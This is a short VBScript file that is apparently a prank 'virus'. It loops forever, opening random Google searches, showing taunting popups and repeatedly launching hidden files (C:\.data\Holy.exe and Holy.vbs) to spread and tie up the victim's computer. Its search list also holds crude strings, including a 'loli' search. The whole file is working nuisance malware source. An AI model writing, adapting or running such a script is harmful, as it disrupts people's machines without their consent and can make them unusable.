Set objShell = CreateObject("WScript.Shell")

searches = Array( _
    "windows 64 virtual box Install", _
    "chatgpt, how remove a cat for my computer", _
    "windows xp delta download 2069 new free full", _
    "taskkill /f /im system.exe", _
    "Aero Malware", _
    "Raphael marinho virus in youtube, Thanks for executing <3", _
    "funny memes funny so funny wow :(", _
    "Raphael marinho virus in youtube, Thanks for executing <3", _
    "winrar crack to install minecraft 2024", _
    "loli cute funny discord pfp" _
)

Do
    Randomize
    randomIndexSearch = Int((UBound(searches) + 1) * Rnd)
    
    searchQuery = searches(randomIndexSearch)
    objShell.Run "https://www.google.com/search?q=" & Replace(searchQuery, " ", "+")
    WScript.Sleep 20000
    objShell.Popup "a new Friend, pls don't kill him", 3, "lol", vbExclamation
    objShell.Run """C:\.data\Holy.exe""", 1, False
    objShell.Run """C:\.data\Holy.vbs""", 1, False
    Wscript.Sleep 10000
Loop
